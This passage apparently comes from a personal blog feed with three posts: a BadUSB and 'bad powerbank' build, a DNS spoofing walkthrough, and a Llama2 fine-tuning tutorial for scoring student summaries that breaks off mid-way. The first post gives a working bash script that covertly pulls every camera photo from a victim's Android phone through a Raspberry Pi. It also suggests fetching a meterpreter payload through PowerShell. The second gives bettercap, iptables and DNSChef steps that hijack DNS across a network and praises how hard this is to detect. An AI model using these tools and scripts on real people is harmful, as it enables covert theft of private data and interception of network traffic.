    <content><![CDATA[<p>To perform a badusb attack, you need to have a tiny Development board to write your payload on it. The Arduino development board is a good choice. </p>
<p>Then you should make the development board execute your own payload, there are some Github repositories to get the payloads, like <a href="https://github.com/Screetsec/Pateensy">https://github.com/Screetsec/Pateensy</a> for Teensy board and <a href="https://github.com/recursively/BadUSB-code">https://github.com/recursively/BadUSB-code</a> for Arduino Leonardo. </p>
<p>It’s hard to tell the difference between the Arduino Leonardo board and the normal USB flash disk.</p>
<img src="/2019/01/11/Devices-For-Badusb-And-Badpowerbank/pic_5.jpeg" width="60%" height="60%">

<p>By the way, The badusb acts like a keyboard, you can download the meterpreter payload or something else from your personal server and execute it automatically with PowerShell.</p>
<p>Or you want to pull some data from or to push some virus to someone’s telephone with just a powerbank. The easiest way is to use the Raspberry Pi Zero.</p>
<p>To get started, burn a fresh image of Raspbian distribution to a micro SD card on your desktop with software like SD Card Formatter or something else.</p>
<p>Once that’s finished, navigate to the root directory of the micro SD card and open the file <em>config.txt</em>. Scroll down to the bottom of the file and add <em>dtoverlay=dwc2</em> to a new line.</p>
<img src="/2019/01/11/Devices-For-Badusb-And-Badpowerbank/pic_1.png" width="60%" height="60%">

<p>Save and exit the <em>config.txt</em> file.</p>
<p>Then open the <em>cmdline.txt</em> file, find the command <em>rootwait</em> and add <em>modules-load=dwc2,g_ether</em> after it.</p>
<img src="/2019/01/11/Devices-For-Badusb-And-Badpowerbank/pic_2.png" width="60%" height="60%">

<p>Save and exit the <em>cmdline.txt</em> file.</p>
<p>Then insert your SD card into your Raspberry Pi Zero, connect the USB port between your computer and your Pi Zero.</p>
<p>If you are using MacOS, it will be much easier to connect to the SSH service on your Pi Zero. You can find the new network device in the network settings.</p>
<img src="/2019/01/11/Devices-For-Badusb-And-Badpowerbank/pic_3.png" width="30%" height="30%">

<p>After that, you can just use address <em>raspberrypi.local</em> to log in to your Pi.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh pi@raspberrypi.local</span><br></pre></td></tr></table></figure>

<p>Install the ADB tools on your Raspberry Pi. You can learn about more details of ADB tools from <a href="https://developer.android.com/studio/command-line/adb">https://developer.android.com/studio/command-line/adb</a>.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y android-tools-adb android-tools-fastboot</span><br></pre></td></tr></table></figure>

<p>Making sure the adb tools work properly.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>
<p>You can see a list of available Android devices if everything goes well.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">List of devices attached</span><br><span class="line">12c264a0	device</span><br></pre></td></tr></table></figure>

<p>Making sure your Pi is connected to the Wi-Fi network, so you can log in to your Pi wirelessly.</p>
<p>A portable power source is necessary.</p>
<img src="/2019/01/11/Devices-For-Badusb-And-Badpowerbank/pic_4.jpeg" width="60%" height="60%">

<p>The Android telephone can be debugged only when the developer mode is turned on and the USB debugging is allowed.</p>
<p>Here I wrote a piece of code to grab the photos from the target telephone.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">flag=0</span><br><span class="line">flagone=0</span><br><span class="line">while [ $flag -eq 0 ]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">while</span> (adb devices | grep -w device)</span></span><br><span class="line">do</span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="keyword">if</span> [ -e /dev/libmtp* ]</span></span><br><span class="line">	if adb devices | grep -w device &gt; /dev/null ;</span><br><span class="line">	then</span><br><span class="line">		if [ $flagone -eq 0 ]</span><br><span class="line">		then</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">		<span class="built_in">echo</span> <span class="keyword">done</span>!</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">		adb pull /mnt/sdcard/DCIM/Camera &gt; /dev/null</span></span><br><span class="line">		adb pull /storage/self/primary/DCIM/Camera &gt; /dev/null</span><br><span class="line">		echo done!</span><br><span class="line">		flagone=1</span><br><span class="line">	fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="built_in">sleep</span> 10s</span></span><br><span class="line">	elif ! adb devices | grep -w device &gt; /dev/null ;</span><br><span class="line">	then</span><br><span class="line">		flagone=0</span><br><span class="line">	fi</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>When the telephone is plugged into the Pi, all the photos will be pulled from the target telephone. </p>
]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>Badusb</tag>
        <tag>powerbank</tag>
      </tags>
  </entry>
  <entry>
    <title>Efficient DNS Spoofing</title>
    <url>/2019/10/14/Efficient-DNS-Spoofing/</url>
    <content><![CDATA[<p>There are a couple of DNS spoofing tools available on the Internet like arpspoof and ettercap. They are not convenient and robust enough as I expected. In fact, nobody wants to use such tools at the expense of low network speed, I mean, very very low speed that you cannot even open a single page most of the time as a victim. The reason is the bad performance of arpspoof. So bettercap will be a perfect proposal.</p>
<p>This is not a tutorial of bettercap, actually, I’m not familiar with many advanced features of it. Now let’s get to know about the DNS spoofing in bettercap.</p>
<p>Install bettercap if you don’t have it.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install bettercap</span><br></pre></td></tr></table></figure>
<p>If you want to get some information about how to use bettercap, use the “help” command.</p>
<img src="/2019/10/14/Efficient-DNS-Spoofing/pic_2.png" width="100%" height="100%">

<p>We use the DNS spoofing module here and modify the configuration.</p>
<img src="/2019/10/14/Efficient-DNS-Spoofing/pic_1.png" width="100%" height="100%">

<p>Change the DNS server on the target host to our attacking machine.</p>
<img src="/2019/10/14/Efficient-DNS-Spoofing/pic_3.jpeg" width="30%" height="30%">

<p>Create a new file named <em>readme.txt</em> on my attacking machine, and start up the python HTTP server for web page hijacking.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch readme.txt</span><br><span class="line">python -m http.server</span><br></pre></td></tr></table></figure>

<p>Now, most of the work is done. Let’s take a look at the effect. I visited <em>a.google.com:8000</em>.</p>
<img src="/2019/10/14/Efficient-DNS-Spoofing/pic_4.jpeg" width="60%" height="60%">

<p>But we still have a problem here, how can we change all the DNS configurations in every single host within the same intranet? I have tried to add DNS forwarding in the OpenWrt router, but it didn’t work, maybe I made some mistakes somewhere. So I have to try another stupid method which I mentioned in my previous post(<a href="https://recursively.review/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/">https://recursively.review/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/</a>). Forwarding all the DNS requests to my attacking server. </p>
<p>I set the IP address of my machine to a static IP address for convenience. Make some changes to the file <em>/etc/network/interfaces</em>.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.2.254</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.2.1</span><br></pre></td></tr></table></figure>

<p>To the file <em>/etc/resolv.conf</em>.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">domain</span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line">search localdomain</span><br></pre></td></tr></table></figure>

<p>Then the IP address will be set to 192.168.2.254 with a reboot.</p>
<img src="/2019/10/14/Efficient-DNS-Spoofing/pic_6.png" width="100%" height="100%">

<p>DNS requests use both TCP and UDP protocol, so we should make some changes to get it to work.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -m iprange --src-range 192.168.2.2-192.168.2.253  -p tcp --dport 53 -j DNAT --to-destination 192.168.2.254:53</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -m iprange --src-range 192.168.2.2-192.168.2.253  -p udp --dport 53 -j DNAT --to-destination 192.168.2.254:53</span><br></pre></td></tr></table></figure>

<p>So all the DNS requests traffic will be forwarded to my attacking machine without changing the DNS server in every single host.</p>
<img src="/2019/10/14/Efficient-DNS-Spoofing/pic_5.png" width="60%" height="60%">

<p>Here comes another problem, we can’t browse other websites normally. So we have to take other approaches to achieve that, DNSChef will always be my choice.</p>
<p>Shutdown the bettercap server and clone the DNSChef(<a href="https://github.com/iphelix/dnschef">https://github.com/iphelix/dnschef</a>) repository. Modify the file <em>dnschef.ini</em>.</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">*.<span class="attr">google.com</span>=<span class="number">192.168</span>.<span class="number">2.254</span></span><br></pre></td></tr></table></figure>

<p>Start up DNSChef server.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python dnschef.py --file=dnschef.ini --nameservers=8.8.8.8 --interface=192.168.2.254</span><br></pre></td></tr></table></figure>

<p>It will be very difficult to detect anything abnormal in this case. </p>
]]></content>
      <categories>
        <category>Hacking</category>
      </categories>
      <tags>
        <tag>MITM</tag>
        <tag>DNS spoofing</tag>
        <tag>Bettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>Enhancing Student Text Summarization with Llama2 Fine Tuning</title>
    <url>/2023/10/31/Enhancing-Student-Text-Summarization-with-Llama2-Fine-Tuning/</url>
    <content><![CDATA[<img src="/2023/10/31/Enhancing-Student-Text-Summarization-with-Llama2-Fine-Tuning/llama.png" width="60%" height="60%">

<h2 id="Dataset-Preparation-and-Preprocessing"><a href="#Dataset-Preparation-and-Preprocessing" class="headerlink" title="Dataset Preparation and Preprocessing"></a>Dataset Preparation and Preprocessing</h2><p>For the dataset I used in this post, I chose it from the Kaggle competition: <a href="https://www.kaggle.com/competitions/commonlit-evaluate-student-summaries/overview">https://www.kaggle.com/competitions/commonlit-evaluate-student-summaries/overview</a>. The goal of this competition is to assess the quality of summaries written by students in grades 3-12. We need to build a model that evaluates how well a student represents the main idea and details of a source text, as well as the clarity, precision, and fluency of the language used in the summary. The data can be downloaded by this link: <a href="https://www.kaggle.com/competitions/commonlit-evaluate-student-summaries/data">https://www.kaggle.com/competitions/commonlit-evaluate-student-summaries/data</a>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df1 = pd.read_csv(<span class="string">&quot;data/commonlit-evaluate-student-summaries/prompts_train.csv&quot;</span>)</span><br><span class="line">df2 = pd.read_csv(<span class="string">&quot;data/commonlit-evaluate-student-summaries/summaries_train.csv&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">merged_df = df2.merge(df1, left_on=<span class="string">&#x27;prompt_id&#x27;</span>, right_on=<span class="string">&#x27;prompt_id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">merged_df = merged_df.drop(columns=[<span class="string">&#x27;student_id&#x27;</span>, <span class="string">&#x27;prompt_id&#x27;</span>])</span><br><span class="line"><span class="comment"># 9:1 for train and rest</span></span><br><span class="line">train_data, test_data = train_test_split(merged_df, test_size=<span class="number">0.1</span>, random_state=<span class="number">123456</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(train_data), <span class="string">&quot;train +&quot;</span>, <span class="built_in">len</span>(test_data), <span class="string">&quot;test&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">train_data_dict = train_data.to_dict(orient=<span class="string">&#x27;records&#x27;</span>)</span><br><span class="line">test_data_dict = test_data.to_dict(orient=<span class="string">&#x27;records&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./data/llama2-fine-tune-input/train.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(train_data_dict, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./data/llama2-fine-tune-input/test.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(test_data_dict, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> load_dataset</span><br><span class="line"></span><br><span class="line">train_dataset = load_dataset(<span class="string">&#x27;json&#x27;</span>, data_files=<span class="string">&#x27;./data/llama2-fine-tune-input/train.json&#x27;</span>, split=<span class="string">&#x27;train&#x27;</span>)</span><br><span class="line">eval_dataset = load_dataset(<span class="string">&#x27;json&#x27;</span>, data_files=<span class="string">&#x27;./data/llama2-fine-tune-input/val.json&#x27;</span>, split=<span class="string">&#x27;train&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">formatting_func</span>(<span class="params">example</span>):</span><br><span class="line">    text = <span class="string">f&#x27;&#x27;&#x27;### Instruction:</span></span><br><span class="line"><span class="string">Below is a summary evaluation task for the summary written by students. Title is the title of the text. Text is the text students need to write summary of. Question is the question for the students to follow. Summary is the summary written by students. Score of summary contains the score of wording and score of content. Write the score of wording and score of content according to the summary written by students.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Title:</span></span><br><span class="line"><span class="string"><span class="subst">&#123;example[<span class="string">&#x27;prompt_title&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Text:</span></span><br><span class="line"><span class="string"><span class="subst">&#123;example[<span class="string">&#x27;prompt_text&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Question:</span></span><br><span class="line"><span class="string"><span class="subst">&#123;example[<span class="string">&#x27;prompt_question&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Summary:</span></span><br><span class="line"><span class="string"><span class="subst">&#123;example[<span class="string">&#x27;text&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Score of Summary: </span></span><br><span class="line"><span class="string">Wording: <span class="subst">&#123;example[<span class="string">&#x27;wording&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string">Content: <span class="subst">&#123;example[<span class="string">&#x27;content&#x27;</span>]&#125;</span>&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text</span><br></pre></td></tr></table></figure>

<p>Let’s take a look at the output of the formatting function.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(formatting_func(train_dataset[randrange(<span class="built_in">len</span>(train_dataset))]))</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">### Instruction:</span><br><span class="line">Below is a summary evaluation task for the summary written by students. Title is the title of the text. Text is the text students need to write summary of. Question is the question for the students to follow. Summary is the summary written by students. Score of summary contains the score of wording and score of content. Write the score of wording and score of content according to the summary written by students.</span><br><span class="line"></span><br><span class="line">### Title:</span><br><span class="line">Egyptian Social Structure</span><br><span class="line"></span><br><span class="line">### Text:</span><br><span class="line">Egyptian society was structured like a pyramid. At the top were the gods, such as Ra, Osiris, and Isis. Egyptians believed that the gods controlled the universe. Therefore, it was important to keep them happy. They could make the Nile overflow, cause famine, or even bring death. </span><br><span class="line">The Egyptians also elevated some human beings to gods. Their leaders, called pharaohs, were believed to be gods in human form. They had absolute power over their subjects. After pharaohs died, huge stone pyramids were built as their tombs. Pharaohs were buried in chambers within the pyramids. </span><br><span class="line">Because the people of Egypt believed that their pharaohs were gods, they entrusted their rulers with many responsibilities. Protection was at the top of the list. The pharaoh directed the army in case of a foreign threat or an internal conflict. All laws were enacted at the discretion of the pharaoh. Each farmer paid taxes in the form of grains, which were stored in the pharaoh’s warehouses. This grain was used to feed the people in the event of a famine. </span><br><span class="line">The Chain of Command </span><br><span class="line">No single person could manage all these duties without assistance. The pharaoh appointed a chief minister called a vizier as a supervisor. The vizier ensured that taxes were collected. </span><br><span class="line">Working with the vizier were scribes who kept government records. These high-level employees had mastered a rare skill in ancient Egypt — they could read and write. </span><br><span class="line">Noble Aims </span><br><span class="line">Right below the pharaoh in status were powerful nobles and priests. Only nobles could hold government posts; in these positions they profited from tributes paid to the pharaoh. Priests were responsible for pleasing the gods. </span><br><span class="line">Nobles enjoyed great status and also grew wealthy from donations to the gods. All Egyptians—from pharaohs to farmers—gave gifts to the gods. </span><br><span class="line">Soldier On </span><br><span class="line">Soldiers fought in wars or quelled domestic uprisings. During long periods of peace, soldiers also supervised the peasants, farmers, and slaves who were involved in building such structures as pyramids and palaces. </span><br><span class="line">Skilled workers such as physicians and craftsmen/women made up the middle class. Craftsmen made and sold jewelry, pottery, papyrus products, tools, and other useful things. </span><br><span class="line">Naturally, there were people needed to buy goods from artisans and traders. These were the merchants and storekeepers who sold these goods to the public. </span><br><span class="line">The Bottom of the Heap </span><br><span class="line">At the bottom of the social structure were slaves and farmers. Slavery became the fate of those captured as prisoners of war. In addition to being forced to work on building projects, slaves toiled at the discretion of the pharaoh or nobles. </span><br><span class="line">Farmers tended the fields, raised animals, kept canals and reservoirs in good order, worked in the stone quarries, and built the royal monuments. Farmers paid taxes that could amount to as much as 60% of their yearly harvest—that’s a lot of hay! </span><br><span class="line">Social mobility was not impossible. A small number of peasants and farmers moved up the economic ladder. Families saved money to send their sons to village schools to learn trades. These schools were run by priests or by artisans. Boys who learned to read and write could become scribes, then go on to gain employment in the government. It was possible for a boy born on a farm to work his way up into the higher ranks of the government. Bureaucracy proved lucrative.</span><br><span class="line"></span><br><span class="line">### Question:</span><br><span class="line">In complete sentences, summarize the structure of the ancient Egyptian system of government. How were different social classes involved in this government? Cite evidence from the text.</span><br><span class="line"></span><br><span class="line">### Summary:</span><br><span class="line">The Egyptian&#x27;s system of goverment was based of the statis the people were in , Like how ,&quot;At the bottom of the socail structure were slaves and farmers.&quot; While ,&quot;Right below the pharaoh in status were powerful nobles and priests.&quot; As well as ,&quot;Only nobles could hold government posts.&quot;</span><br><span class="line"></span><br><span class="line">### Score of Summary: </span><br><span class="line">Wording: -1.38566071478225</span><br><span class="line">Content: -0.18539193846186</span><br></pre></td></tr></table></figure>

<h2 id="Modeling"><a href="#Modeling" class="headerlink" title="Modeling"></a>Modeling</h2><h3 id="Load-Base-Model"><a href="#Load-Base-Model" class="headerlink" title="Load Base Model"></a>Load Base Model</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> LlamaForCausalLM, LlamaTokenizer</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">config.HF_DATASETS_CACHE = <span class="string">&#x27;/data/yuhong_zhao/cache/datasets&#x27;</span></span><br><span class="line"></span><br><span class="line">model_id=<span class="string">&quot;meta-llama/Llama-2-7b-hf&quot;</span></span><br><span class="line"></span><br><span class="line">tokenizer = LlamaTokenizer.from_pretrained(</span><br><span class="line">    model_id,</span><br><span class="line">    <span class="comment"># padding_side=&quot;left&quot;,</span></span><br><span class="line">    <span class="comment"># add_eos_token=True,</span></span><br><span class="line">    <span class="comment"># add_bos_token=True,</span></span><br><span class="line">)</span><br><span class="line">tokenizer.pad_token = tokenizer.eos_token</span><br><span class="line"></span><br><span class="line">model =LlamaForCausalLM.from_pretrained(model_id, load_in_8bit=<span class="literal">True</span>, device_map=<span class="string">&#x27;auto&#x27;</span>, torch_dtype=torch.float16, cache_dir=<span class="string">&#x27;/data/yuhong_zhao/cache/transformers&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>This type of task can be appropriately handled by multiple models including common machine learning models such as logistic regression, random forest, svm, hidden Markov, as well as deep learning models such as LSTM, BERT, and GPT. However, in this post, I will focus on the application of Llama2 in order to be familiar with it and explore its capabilities.</p>
<h3 id="Check-Base-Model"><a href="#Check-Base-Model" class="headerlink" title="Check Base Model"></a>Check Base Model</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval_prompt = <span class="string">&quot;&quot;&quot;### Instruction:</span></span><br><span class="line"><span class="string">Below is a summary evaluation task for the summary written by students. Title is the title of the text. Text is the text students need to write summary of. Question is the question for the students to follow. Summary is the summary written by students. Score of summary contains the score of wording and score of content. Write the score of wording and score of content according to the summary written by students.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Title:</span></span><br><span class="line"><span class="string">Egyptian Social Structure</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Text:</span></span><br><span class="line"><span class="string">Egyptian society was structured like a pyramid. At the top were the gods, such as Ra, Osiris, and Isis. Egyptians believed that the gods controlled the universe. Therefore, it was important to keep them happy. They could make the Nile overflow, cause famine, or even bring death. \r\nThe Egyptians also elevated some human beings to gods. Their leaders, called pharaohs, were believed to be gods in human form. They had absolute power over their subjects. After pharaohs died, huge stone pyramids were built as their tombs. Pharaohs were buried in chambers within the pyramids. \r\nBecause the people of Egypt believed that their pharaohs were gods, they entrusted their rulers with many responsibilities. Protection was at the top of the list. The pharaoh directed the army in case of a foreign threat or an internal conflict. All laws were enacted at the discretion of the pharaoh. Each farmer paid taxes in the form of grains, which were stored in the pharaoh’s warehouses. This grain was used to feed the people in the event of a famine. \r\nThe Chain of Command \r\nNo single person could manage all these duties without assistance. The pharaoh appointed a chief minister called a vizier as a supervisor. The vizier ensured that taxes were collected. \r\nWorking with the vizier were scribes who kept government records. These high-level employees had mastered a rare skill in ancient Egypt — they could read and write. \r\nNoble Aims \r\nRight below the pharaoh in status were powerful nobles and priests. Only nobles could hold government posts; in these positions they profited from tributes paid to the pharaoh. Priests were responsible for pleasing the gods. \r\nNobles enjoyed great status and also grew wealthy from donations to the gods. All Egyptians—from pharaohs to farmers—gave gifts to the gods. \r\nSoldier On \r\nSoldiers fought in wars or quelled domestic uprisings. During long periods of peace, soldiers also supervised the peasants, farmers, and slaves who were involved in building such structures as pyramids and palaces. \r\nSkilled workers such as physicians and craftsmen/women made up the middle class. Craftsmen made and sold jewelry, pottery, papyrus products, tools, and other useful things. \r\nNaturally, there were people needed to buy goods from artisans and traders. These were the merchants and storekeepers who sold these goods to the public. \r\nThe Bottom of the Heap \r\nAt the bottom of the social structure were slaves and farmers. Slavery became the fate of those captured as prisoners of war. In addition to being forced to work on building projects, slaves toiled at the discretion of the pharaoh or nobles. \r\nFarmers tended the fields, raised animals, kept canals and reservoirs in good order, worked in the stone quarries, and built the royal monuments. Farmers paid taxes that could amount to as much as 60% of their yearly harvest—that’s a lot of hay! \r\nSocial mobility was not impossible. A small number of peasants and farmers moved up the economic ladder. Families saved money to send their sons to village schools to learn trades. These schools were run by priests or by artisans. Boys who learned to read and write could become scribes, then go on to gain employment in the government. It was possible for a boy born on a farm to work his way up into the higher ranks of the government. Bureaucracy proved lucrative.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Question:</span></span><br><span class="line"><span class="string">In complete sentences, summarize the structure of the ancient Egyptian system of government. How were different social classes involved in this government? Cite evidence from the text.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Summary:</span></span><br><span class="line"><span class="string">The acient system of government for Egypt went like this. Social calsses went from slaves, farmers/workers, traders, preits, and kings. This was involved in government because they each had to follow rules from the pharos and if they didn&#x27;t they would have a punishment. The punishment could be Karma, or execution. Also they each had to pay the pharos taxes. ( From farmers) Priets were Also responsible for pleasing the gods and Pharos. These are reasons how government and how different social classes in government were involved during it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Score of Summary:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">model_input = tokenizer(eval_prompt, return_tensors=<span class="string">&quot;pt&quot;</span>, truncation=<span class="literal">True</span>).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="built_in">print</span>(tokenizer.decode(model.generate(**model_input, max_new_tokens=<span class="number">100</span>)[<span class="number">0</span>], skip_special_tokens=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure>

<p>I was surprised to find that the original base model already exhibited a good performance on this task. The output of the base model is as follows:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">### Instruction:</span><br><span class="line">Below is a summary evaluation task for the summary written by students. Title is the title of the text. Text is the text students need to write summary of. Question is the question for the students to follow. Summary is the summary written by students. Score of summary contains the score of wording and score of content. Write the score of wording and score of content according to the summary written by students.</span><br><span class="line"></span><br><span class="line">### Title:</span><br><span class="line">Egyptian Social Structure</span><br><span class="line"></span><br><span class="line">### Text:</span><br><span class="line">Egyptian society was structured like a pyramid. At the top were the gods, such as Ra, Osiris, and Isis. Egyptians believed that the gods controlled the universe. Therefore, it was important to keep them happy. They could make the Nile overflow, cause famine, or even bring death. </span><br><span class="line">The Egyptians also elevated some human beings to gods. Their leaders, called pharaohs, were believed to be gods in human form. They had absolute power over their subjects. After pharaohs died, huge stone pyramids were built as their tombs. Pharaohs were buried in chambers within the pyramids. </span><br><span class="line">Because the people of Egypt believed that their pharaohs were gods, they entrusted their rulers with many responsibilities. Protection was at the top of the list. The pharaoh directed the army in case of a foreign threat or an internal conflict. All laws were enacted at the discretion of the pharaoh. Each farmer paid taxes in the form of grains, which were stored in the pharaoh’s warehouses. This grain was used to feed the people in the event of a famine. </span><br><span class="line">The Chain of Command </span><br><span class="line">No single person could manage all these duties without assistance. The pharaoh appointed a chief minister called a vizier as a supervisor. The vizier ensured that taxes were collected. </span><br><span class="line">Working with the vizier were scribes who kept government records. These high-level employees had mastered a rare skill in ancient Egypt — they could read and write. </span><br><span class="line">Noble Aims </span><br><span class="line">Right below the pharaoh in status were powerful nobles and priests. Only nobles could hold government posts; in these positions they profited from tributes paid to the pharaoh. Priests were responsible for pleasing the gods. </span><br><span class="line">Nobles enjoyed great status and also grew wealthy from donations to the gods. All Egyptians—from pharaohs to farmers—gave gifts to the gods. </span><br><span class="line">Soldier On </span><br><span class="line">Soldiers fought in wars or quelled domestic uprisings. During long periods of peace, soldiers also supervised the peasants, farmers, and slaves who were involved in building such structures as pyramids and palaces. </span><br><span class="line">Skilled workers such as physicians and craftsmen/women made up the middle class. Craftsmen made and sold jewelry, pottery, papyrus products, tools, and other useful things. </span><br><span class="line">Naturally, there were people needed to buy goods from artisans and traders. These were the merchants and storekeepers who sold these goods to the public. </span><br><span class="line">The Bottom of the Heap </span><br><span class="line">At the bottom of the social structure were slaves and farmers. Slavery became the fate of those captured as prisoners of war. In addition to being forced to work on building projects, slaves toiled at the discretion of the pharaoh or nobles. </span><br><span class="line">Farmers tended the fields, raised animals, kept canals and reservoirs in good order, worked in the stone quarries, and built the royal monuments. Farmers paid taxes that could amount to as much as 60% of their yearly harvest—that’s a lot of hay! </span><br><span class="line">Social mobility was not impossible. A small number of peasants and farmers moved up the economic ladder. Families saved money to send their sons to village schools to learn trades. These schools were run by priests or by artisans. Boys who learned to read and write could become scribes, then go on to gain employment in the government. It was possible for a boy born on a farm to work his way up into the higher ranks of the government. Bureaucracy proved lucrative.</span><br><span class="line"></span><br><span class="line">### Question:</span><br><span class="line">In complete sentences, summarize the structure of the ancient Egyptian system of government. How were different social classes involved in this government? Cite evidence from the text.</span><br><span class="line"></span><br><span class="line">### Summary:</span><br><span class="line">The acient system of government for Egypt went like this. Social calsses went from slaves, farmers/workers, traders, preits, and kings. This was involved in government because they each had to follow rules from the pharos and if they didn&#x27;t they would have a punishment. The punishment could be Karma, or execution. Also they each had to pay the pharos taxes. ( From farmers) Priets were Also responsible for pleasing the gods and Pharos. These are reasons how government and how different social classes in government were involved during it.</span><br><span class="line"></span><br><span class="line">### Score of Summary:</span><br><span class="line">Score of wording: 6/10</span><br><span class="line">Score of content: 9/10</span><br></pre></td></tr></table></figure>

<h3 id="Tokenization"><a href="#Tokenization" class="headerlink" title="Tokenization"></a>Tokenization</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_and_tokenize_prompt</span>(<span class="params">prompt</span>):</span><br><span class="line">    <span class="keyword">return</span> tokenizer(formatting_func(prompt), truncation=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tokenized_train_dataset = train_dataset.<span class="built_in">map</span>(generate_and_tokenize_prompt)</span><br><span class="line">tokenized_val_dataset = eval_dataset.<span class="built_in">map</span>(generate_and_tokenize_prompt)</span><br></pre></td></tr></table></figure>

<p>Let’s take a look at the tokenized dataset.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tokenized_train_dataset</span><br></pre></td></tr></table></figure>

